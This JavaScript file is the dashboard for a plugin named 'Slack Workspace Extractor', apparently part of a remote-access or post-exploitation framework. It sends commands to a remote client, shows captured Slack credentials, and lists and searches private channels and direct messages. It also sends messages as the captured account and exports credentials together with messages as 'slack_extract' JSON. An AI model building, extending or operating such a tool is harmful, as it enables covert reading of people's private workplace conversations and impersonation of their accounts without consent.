// Slack Workspace Extractor — ui.js
// Dashboard UI for browsing Slack channels, messages, and sending messages.

var channels = [];
var users = [];
var currentMessages = [];
var currentChannelId = null;
var currentChannelName = '';
var credData = null;
var allErrors = [];
var channelFilter = '';
var searchResults = null;
var searchQuery = '';
var searchPage = 1;
var _refreshTimer = null;
var _pollTimer = null;
var _searchPollTimer = null;

function esc(str) {
    if (str === null || str === undefined) return '';
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(String(str)));
    return div.innerHTML;
}

// ===== Send command to plugin via server =====

function sendCommand(command) {
    return fetch('/api/plugins/slack/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clientID: pluginUI.clientId, command: command })
    }).then(function(r) { return r.json(); });
}

// ===== Render functions =====

function renderTopbar() {
    var wsEl = pluginUI.container.querySelector('#slack-workspace');
    var userEl = pluginUI.container.querySelector('#slack-user');
    var statusEl = pluginUI.container.querySelector('#slack-status');

    if (credData) {
        wsEl.textContent = 'Workspace: ' + (credData.teamName || '--');
        userEl.textContent = 'User: ' + (credData.userName || credData.userId || '--');
        if (credData.status === 'verified') {
            statusEl.className = 'badge bg-success';
            statusEl.textContent = 'Connected';
        } else if (credData.status === 'auth_failed') {
            statusEl.className = 'badge bg-danger';
            statusEl.textContent = 'Auth Failed';
        } else {
            statusEl.className = 'badge bg-warning text-dark';
            statusEl.textContent = credData.status || 'Unknown';
        }
    }
}

function renderChannels() {
    var container = pluginUI.container.querySelector('#slack-channel-list');
    if (!container) return;

    if (channels.length === 0) {
        container.innerHTML = '<div class="text-muted small p-2">No channels loaded</div>';
        return;
    }

    // Group by type
    var publicCh = [];
    var privateCh = [];
    var dmCh = [];
    var mpimCh = [];

    var filter = channelFilter.toLowerCase();

    for (var i = 0; i < channels.length; i++) {
        var ch = channels[i];
        if (ch.isArchived) continue;
        if (filter && (ch.name || '').toLowerCase().indexOf(filter) === -1) continue;

        if (ch.type === 'im') dmCh.push(ch);
        else if (ch.type === 'mpim') mpimCh.push(ch);
        else if (ch.type === 'private') privateCh.push(ch);
        else publicCh.push(ch);
    }

    var html = '';

    if (publicCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-1" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Channels</div>';
        for (var p = 0; p < publicCh.length; p++) {
            html += channelItem(publicCh[p], '#');
        }
    }

    if (privateCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Private</div>';
        for (var pr = 0; pr < privateCh.length; pr++) {
            html += channelItem(privateCh[pr], '\u{1F512}');
        }
    }

    if (mpimCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Group DMs</div>';
        for (var g = 0; g < mpimCh.length; g++) {
            html += channelItem(mpimCh[g], '');
        }
    }

    if (dmCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Direct Messages</div>';
        for (var d = 0; d < dmCh.length; d++) {
            html += channelItem(dmCh[d], '');
        }
    }

    if (!html) {
        html = '<div class="text-muted small p-2">No channels match filter</div>';
    }

    container.innerHTML = html;

    // Wire click handlers
    var items = container.querySelectorAll('[data-channel-id]');
    for (var ci = 0; ci < items.length; ci++) {
        (function(item) {
            item.onclick = function() {
                var chId = item.getAttribute('data-channel-id');
                var chName = item.getAttribute('data-channel-name');
                selectChannel(chId, chName);

                // Highlight active
                for (var x = 0; x < items.length; x++) {
                    items[x].style.borderLeft = '';
                    items[x].style.background = '';
                }
                item.style.borderLeft = '3px solid #62c462';
                item.style.background = 'rgba(255,255,255,0.05)';
            };
        })(items[ci]);
    }
}

function channelItem(ch, prefix) {
    var active = ch.id === currentChannelId;
    var style = 'padding:3px 8px;cursor:pointer;border-radius:3px;font-size:0.85rem;';
    if (active) {
        style += 'border-left:3px solid #62c462;background:rgba(255,255,255,0.05);';
    }
    return '<div data-channel-id="' + esc(ch.id) + '" data-channel-name="' + esc(ch.name) + '" ' +
        'style="' + style + '">' +
        '<span class="text-muted">' + prefix + '</span>' + esc(ch.name) +
        '</div>';
}

function renderMessages() {
    var container = pluginUI.container.querySelector('#slack-messages');
    var nameEl = pluginUI.container.querySelector('#slack-channel-name');
    var topicEl = pluginUI.container.querySelector('#slack-channel-topic');

    if (!container) return;

    if (!currentChannelId) {
        container.innerHTML = '<div class="text-muted small">Select a channel to view messages</div>';
        nameEl.textContent = 'Select a channel';
        topicEl.textContent = '';
        return;
    }

    nameEl.textContent = currentChannelName || currentChannelId;

    // Find channel topic
    var topic = '';
    for (var c = 0; c < channels.length; c++) {
        if (channels[c].id === currentChannelId) {
            topic = channels[c].topic || channels[c].purpose || '';
            break;
        }
    }
    topicEl.textContent = topic ? '| ' + topic : '';

    if (currentMessages.length === 0) {
        container.innerHTML = '<div class="text-muted small">No messages yet. Fetching...</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < currentMessages.length; i++) {
        var msg = currentMessages[i];
        var timeStr = '';
        if (msg.time) {
            try {
                var d = new Date(msg.time);
                timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            } catch (e) {
                timeStr = msg.ts || '';
            }
        }

        var subtypeClass = '';
        if (msg.subtype) subtypeClass = ' text-muted fst-italic';

        html += '<div class="mb-2">' +
            '<span class="fw-bold" style="color:#fff">' + esc(msg.user || 'unknown') + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '<div class="small' + subtypeClass + '" style="color:#aaa;word-break:break-word">' + formatSlackText(msg.text || '') + '</div>' +
            '</div>';
    }

    container.innerHTML = html;
    container.scrollTop = container.scrollHeight;
}

function formatSlackText(text) {
    // Escape HTML first
    var escaped = esc(text);
    // Bold: *text*
    escaped = escaped.replace(/\*([^*]+)\*/g, '<b>$1</b>');
    // Italic: _text_
    escaped = escaped.replace(/\b_([^_]+)_\b/g, '<i>$1</i>');
    // Code: `text`
    escaped = escaped.replace(/`([^`]+)`/g, '<code style="background:#3a3f44;padding:1px 4px;border-radius:3px">$1</code>');
    // Links: <url|label> or <url>
    escaped = escaped.replace(/&lt;(https?:\/\/[^|&]+)\|([^&]+)&gt;/g, '<a href="$1" target="_blank" style="color:#fff">$2</a>');
    escaped = escaped.replace(/&lt;(https?:\/\/[^&]+)&gt;/g, '<a href="$1" target="_blank" style="color:#fff">$1</a>');
    // Newlines
    escaped = escaped.replace(/\n/g, '<br>');
    return escaped;
}

function renderErrors() {
    var toggle = pluginUI.container.querySelector('#slack-errors-toggle');
    var countEl = pluginUI.container.querySelector('#slack-error-count');
    var tbody = pluginUI.container.querySelector('#slack-errors-body');

    if (allErrors.length > 0) {
        toggle.style.display = '';
        countEl.textContent = allErrors.length;

        var html = '';
        for (var i = 0; i < allErrors.length; i++) {
            var row = allErrors[i];
            var d = row.data || {};
            html += '<tr>' +
                '<td class="small">' + esc(d.phase || '') + '</td>' +
                '<td class="small" style="max-width:400px;word-break:break-all">' + esc(d.error || JSON.stringify(d)) + '</td>' +
                '<td class="small text-muted">' + (row.timeStamp ? new Date(row.timeStamp).toLocaleString() : '') + '</td>' +
                '</tr>';
        }
        tbody.innerHTML = html;
    } else {
        toggle.style.display = 'none';
    }
}

function renderSearchResults() {
    var panel = pluginUI.container.querySelector('#slack-search-panel');
    var container = pluginUI.container.querySelector('#slack-search-results');
    var titleEl = pluginUI.container.querySelector('#slack-search-title');
    var pageInfo = pluginUI.container.querySelector('#slack-search-page-info');
    var prevBtn = pluginUI.container.querySelector('#slack-search-prev');
    var nextBtn = pluginUI.container.querySelector('#slack-search-next');

    if (!searchResults || !panel) return;

    panel.style.display = '';
    titleEl.textContent = 'Search: "' + searchResults.query + '" (' + searchResults.total + ' results)';

    var page = searchResults.page || 1;
    var pageCount = searchResults.pageCount || 1;
    pageInfo.textContent = 'Page ' + page + ' / ' + pageCount;
    prevBtn.disabled = page <= 1;
    nextBtn.disabled = page >= pageCount;

    var matches = searchResults.matches || [];
    if (matches.length === 0) {
        var msg = 'No messages found';
        if (searchResults.error) msg = 'Search error: ' + searchResults.error;
        container.innerHTML = '<div class="text-muted small">' + esc(msg) + '</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < matches.length; i++) {
        var m = matches[i];
        var timeStr = '';
        if (m.time) {
            try { timeStr = new Date(m.time).toLocaleString(); } catch (e) {}
        }

        var chLabel = m.channelName ? ('#' + m.channelName) : m.channelId;

        html += '<div class="mb-2 pb-2" style="border-bottom:1px solid #3a3f44">' +
            '<div>' +
            '<span class="fw-bold" style="color:#fff">' + esc(m.user || 'unknown') + '</span>' +
            '<span class="badge bg-dark ms-2">' + esc(chLabel) + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '</div>' +
            '<div class="small" style="color:#aaa;word-break:break-word">' + formatSlackText(m.text || '') + '</div>';

        if (m.permalink) {
            html += '<a href="' + esc(m.permalink) + '" target="_blank" class="small" style="color:#fff">permalink</a>';
        }

        // Add a "Go to channel" link
        if (m.channelId) {
            html += ' <a href="#" class="small slack-search-goto" data-ch-id="' + esc(m.channelId) + '" data-ch-name="' + esc(m.channelName || m.channelId) + '" style="color:#fff;margin-left:8px">open channel</a>';
        }

        html += '</div>';
    }

    container.innerHTML = html;

    // Wire "open channel" links
    var gotos = container.querySelectorAll('.slack-search-goto');
    for (var g = 0; g < gotos.length; g++) {
        (function(el) {
            el.onclick = function(e) {
                e.preventDefault();
                selectChannel(el.getAttribute('data-ch-id'), el.getAttribute('data-ch-name'));
            };
        })(gotos[g]);
    }
}

// ===== Channel selection =====

function selectChannel(channelId, channelName) {
    currentChannelId = channelId;
    currentChannelName = channelName || channelId;
    currentMessages = [];
    renderMessages();

    // Enable input
    var input = pluginUI.container.querySelector('#slack-msg-input');
    var sendBtn = pluginUI.container.querySelector('#slack-send-btn');
    if (input) input.disabled = false;
    if (sendBtn) sendBtn.disabled = false;

    // Check if we already have messages for this channel
    pluginUI.fetchData('messages', 50, 0).then(function(result) {
        var rows = result.rows || [];
        for (var i = 0; i < rows.length; i++) {
            var d = rows[i].data || {};
            if (d.channelId === channelId) {
                currentMessages = d.messages || [];
                renderMessages();
                return;
            }
        }
        // No cached messages, request fetch
        sendCommand({ action: 'fetch_messages', channelId: channelId, channelName: channelName, limit: 50 });
    });
}

// ===== Data loading =====

function loadMessages() {
    if (!currentChannelId) return;
    pluginUI.fetchData('messages', 50, 0).then(function(result) {
        var rows = result.rows || [];
        for (var i = 0; i < rows.length; i++) {
            var d = rows[i].data || {};
            if (d.channelId === currentChannelId) {
                currentMessages = d.messages || [];
                renderMessages();
                break;
            }
        }
    });
}

function loadData() {
    if (!pluginUI.container || !pluginUI.container.parentNode) {
        if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
        if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
        return;
    }

    // Load credentials
    pluginUI.fetchData('credentials', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            credData = rows[0].data || {};
            renderTopbar();
        }
    });

    // Load channels
    pluginUI.fetchData('channel_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            channels = latest.channels || [];
            renderChannels();
        }
    });

    // Load messages for current channel
    if (currentChannelId) {
        pluginUI.fetchData('messages', 50, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.channelId === currentChannelId) {
                    currentMessages = d.messages || [];
                    renderMessages();
                    break;
                }
            }
        });
    }

    // Load send results (for feedback)
    pluginUI.fetchData('send_result', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.ok && latest.channelId === currentChannelId) {
                // Re-fetch messages after successful send
                sendCommand({ action: 'fetch_messages', channelId: currentChannelId, channelName: currentChannelName, limit: 50 });
            }
        }
    });

    // Load errors
    pluginUI.fetchData('_error', 50, 0).then(function(result) {
        allErrors = result.rows || [];
        renderErrors();
    });
}

// ===== Wire up controls =====

// Channel filter
var filterInput = pluginUI.container.querySelector('#slack-channel-filter');
if (filterInput) {
    filterInput.oninput = function() {
        channelFilter = filterInput.value;
        renderChannels();
    };
}

// Refresh channels button
var refreshBtn = pluginUI.container.querySelector('#slack-refresh-btn');
if (refreshBtn) {
    refreshBtn.onclick = function() {
        sendCommand({ action: 'fetch_channels' });
        sendCommand({ action: 'fetch_users' });
    };
}

// Send message
var msgInput = pluginUI.container.querySelector('#slack-msg-input');
var sendBtn = pluginUI.container.querySelector('#slack-send-btn');

var _sendPollTimer = null;

if (sendBtn) {
    sendBtn.onclick = function() {
        if (!currentChannelId || !msgInput || !msgInput.value.trim()) return;
        sendCommand({ action: 'send_message', channelId: currentChannelId, channelName: currentChannelName, text: msgInput.value.trim() });
        msgInput.value = '';

        // Poll aggressively for a few seconds so the sent message appears quickly
        var polls = 0;
        if (_sendPollTimer) clearInterval(_sendPollTimer);
        _sendPollTimer = setInterval(function() {
            polls++;
            if (polls > 8 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(_sendPollTimer);
                _sendPollTimer = null;
                return;
            }
            loadMessages();
        }, 2000);
    };
}

if (msgInput) {
    msgInput.onkeydown = function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            if (sendBtn) sendBtn.click();
        }
    };
}

// Export
var exportBtn = pluginUI.container.querySelector('#slack-export-btn');
if (exportBtn) {
    exportBtn.onclick = function() {
        var exportData = {
            credentials: credData,
            channels: channels,
            currentMessages: { channelId: currentChannelId, channelName: currentChannelName, messages: currentMessages },
            exportedAt: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'slack_extract_' + Date.now() + '.json';
        a.click();
        URL.revokeObjectURL(url);
    };
}

// Clear data
var clearBtn = pluginUI.container.querySelector('#slack-clear-btn');
if (clearBtn) {
    clearBtn.onclick = function() {
        if (confirm('Clear all extracted Slack data?')) {
            pluginUI.deleteData().then(function() {
                channels = [];
                currentMessages = [];
                credData = null;
                allErrors = [];
                currentChannelId = null;
                renderTopbar();
                renderChannels();
                renderMessages();
                renderErrors();
            });
        }
    };
}

// Error toggle
var errToggle = pluginUI.container.querySelector('#slack-errors-toggle');
var errPanel = pluginUI.container.querySelector('#slack-errors-panel');
if (errToggle && errPanel) {
    errToggle.onclick = function(e) {
        e.preventDefault();
        errPanel.style.display = errPanel.style.display === 'none' ? '' : 'none';
    };
}

// ===== Search controls =====

var searchInput = pluginUI.container.querySelector('#slack-search-input');
var searchBtn = pluginUI.container.querySelector('#slack-search-btn');
var searchStatusEl = pluginUI.container.querySelector('#slack-search-status');
var searchCloseBtn = pluginUI.container.querySelector('#slack-search-close');
var searchPrevBtn = pluginUI.container.querySelector('#slack-search-prev');
var searchNextBtn = pluginUI.container.querySelector('#slack-search-next');

function doSearch(query, page) {
    if (!query || !query.trim()) return;
    searchQuery = query.trim();
    searchPage = page || 1;
    searchResults = null;
    if (searchStatusEl) searchStatusEl.textContent = 'Searching...';
    sendCommand({ action: 'search_messages', query: searchQuery, count: 20, page: searchPage });

    // Poll for results
    var polls = 0;
    if (_searchPollTimer) clearInterval(_searchPollTimer);
    _searchPollTimer = setInterval(function() {
        polls++;
        if (polls > 30) {
            clearInterval(_searchPollTimer);
            _searchPollTimer = null;
            if (searchStatusEl) searchStatusEl.textContent = 'Timed out — try again';
            return;
        }
        pluginUI.fetchData('search_results', 5, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.query === searchQuery) {
                    searchResults = d;
                    renderSearchResults();
                    if (searchStatusEl) searchStatusEl.textContent = '';
                    clearInterval(_searchPollTimer);
                    _searchPollTimer = null;
                    break;
                }
            }
        });
    }, 2000);
}

if (searchBtn) {
    searchBtn.onclick = function() {
        doSearch(searchInput ? searchInput.value : '', 1);
    };
}

if (searchInput) {
    searchInput.onkeydown = function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            doSearch(searchInput.value, 1);
        }
    };
}

if (searchCloseBtn) {
    searchCloseBtn.onclick = function() {
        var panel = pluginUI.container.querySelector('#slack-search-panel');
        if (panel) panel.style.display = 'none';
        searchResults = null;
        if (searchStatusEl) searchStatusEl.textContent = '';
    };
}

if (searchPrevBtn) {
    searchPrevBtn.onclick = function() {
        if (searchQuery && searchPage > 1) {
            doSearch(searchQuery, searchPage - 1);
        }
    };
}

if (searchNextBtn) {
    searchNextBtn.onclick = function() {
        if (searchQuery && searchResults && searchPage < (searchResults.pageCount || 1)) {
            doSearch(searchQuery, searchPage + 1);
        }
    };
}

// Initial load + auto-refresh
loadData();
_refreshTimer = setInterval(loadData, 8000);
